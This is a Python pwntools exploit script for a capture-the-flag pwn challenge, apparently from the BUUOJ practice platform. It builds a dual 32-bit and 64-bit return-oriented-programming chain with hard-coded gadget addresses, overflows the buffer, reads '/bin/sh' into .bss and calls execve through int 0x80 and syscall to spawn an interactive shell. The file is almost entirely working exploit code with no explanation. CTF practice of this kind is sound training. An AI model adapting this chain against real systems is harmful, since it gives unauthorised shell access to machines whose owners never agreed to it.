#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/06/05 16:14:28
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''

# here put the import lib

from pwn import *
from LibcSearcher import *
import pwnlib
debug = 1
context.log_level = 'debug'
context.arch = 'amd64'
if debug:
    sh = process('pwn2')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    IP = 'node3.buuoj.cn'
    port = 27565
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
elf32 = ELF('pwn')
elf64 = ELF('pwn2')
read_32 = elf32.sym['read']
read_64 = elf64.sym['read']
bss_32 = 0x080DA320
bss_64 = 0x00000000006A32E0
# 64-gadget
pop_rdi = 0x00000000004005f6
pop_rsi = 0x0000000000405895
pop_rdx = 0x000000000043b9d5
pop_rax = 0x000000000043b97c
add_rsp_0xd8 = 0x00000000004079d4
syscall = 0x00000000004011dc

# 32_gadget
pop_eax = 0x080a8af6
ppp_edx_ecx_ebx = 0x0806e9f1
add_esp_0x20 = 0x080a69f2
int_80 = 0x080495a3

payload = 'a' * 0x110
payload += p32(add_esp_0x20) + p32(0)
payload += p64(add_rsp_0xd8)
exploit_32 = 'a' * 0x10
exploit_32 += p32(read_32) + p32(ppp_edx_ecx_ebx) + p32(0) + p32(bss_32) + p32(0x10)
exploit_32 += p32(pop_eax) + p32(0xb) + p32(ppp_edx_ecx_ebx) + p32(0) + p32(0) + p32(bss_32) + p32(int_80)
exploit_32 = exploit_32.ljust(0xd8,"\x00")
exploit_64 = p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(bss_64) + p64(pop_rdx) + p64(0x10) + p64(read_64)
exploit_64 += p64(pop_rdi) + p64(bss_64) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(pop_rax) + p64(59) + p64(syscall)
payload += exploit_32
payload += exploit_64
gdb.attach(sh)
pause()
sh.sendline(payload)
sh.sendline("/bin/sh\x00")
sh.interactive()